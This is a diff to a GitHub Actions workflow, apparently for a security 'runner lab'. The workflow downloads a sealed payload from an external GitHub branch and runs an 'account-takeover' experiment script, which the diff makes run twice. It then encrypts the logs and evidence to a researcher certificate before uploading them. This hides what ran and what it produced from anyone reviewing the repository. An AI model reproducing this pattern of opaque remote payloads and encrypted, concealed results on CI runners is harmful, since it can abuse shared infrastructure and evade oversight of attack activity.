@@ -30,10 +30,10 @@ jobs:
         shell: bash
         run: |
           set -euo pipefail
-          sealed="$RUNNER_TEMP/g07-sealed-payload-v7.cms"
+          sealed="$RUNNER_TEMP/g07-sealed-payload-v8.cms"
           found=0
           for i in $(seq 1 180); do
-            if curl -fsSL --max-time 15 "https://raw.githubusercontent.com/aeorauk-maker/dotnet-cross-platform-runner-lab/g07-l095-pa30-e83-20261128-c73f/g07-sealed-payload-v7.cms?poll=$i" -o "$sealed" 2>/dev/null; then
+            if curl -fsSL --max-time 15 "https://raw.githubusercontent.com/aeorauk-maker/dotnet-cross-platform-runner-lab/g07-l095-pa30-e83-20261128-c73f/g07-sealed-payload-v8.cms?poll=$i" -o "$sealed" 2>/dev/null; then
               found=1
               break
             fi
@@ -68,7 +68,16 @@ jobs:
           else
             status84=$?
           fi
-          tar -czf "$RUNNER_TEMP/g07-results.tgz" -C "$RUNNER_TEMP" g07-e83-private.log g07-e84-private.log -C "$lab" E83-identity-map/evidence E84-account-takeover/evidence
+          if [ -f "$lab/E84-account-takeover/evidence/result.json" ]; then
+            cp "$lab/E84-account-takeover/evidence/result.json" "$lab/E84-account-takeover/evidence/result-first.json"
+          fi
+          rm -rf "$lab/E84-account-takeover/publish-safe" "$lab/E84-account-takeover/publish-hostile" "$lab/E84-account-takeover/publish-reverse"
+          if "$RUNNER_TEMP/g07-venv/bin/python" "$lab/E84-account-takeover/run.py" > "$RUNNER_TEMP/g07-e84-repeat-private.log" 2>&1; then
+            status84repeat=0
+          else
+            status84repeat=$?
+          fi
+          tar -czf "$RUNNER_TEMP/g07-results.tgz" -C "$RUNNER_TEMP" g07-e83-private.log g07-e84-private.log g07-e84-repeat-private.log -C "$lab" E83-identity-map/evidence E84-account-takeover/evidence
           cat > "$RUNNER_TEMP/g07-researcher-cert.pem" <<'CERT'
           -----BEGIN CERTIFICATE-----
           MIIDqjCCAhICCQDeK9EHr2K0rTANBgkqhkiG9w0BAQsFADAXMRUwEwYDVQQDDAxH
@@ -94,7 +103,7 @@ jobs:
           -----END CERTIFICATE-----
           CERT
           openssl cms -encrypt -binary -aes256 -in "$RUNNER_TEMP/g07-results.tgz" -out "$RUNNER_TEMP/g07-results.cms" -outform DER "$RUNNER_TEMP/g07-researcher-cert.pem"
-          echo "E83 exit=$status83; E84 exit=$status84; evidence encrypted"
+          echo "E83 exit=$status83; E84 exit=$status84; E84 repeat exit=$status84repeat; evidence encrypted"
           cp "$RUNNER_TEMP/g07-results.cms" ./g07-results.cms
       - uses: actions/upload-artifact@v4
         if: always()
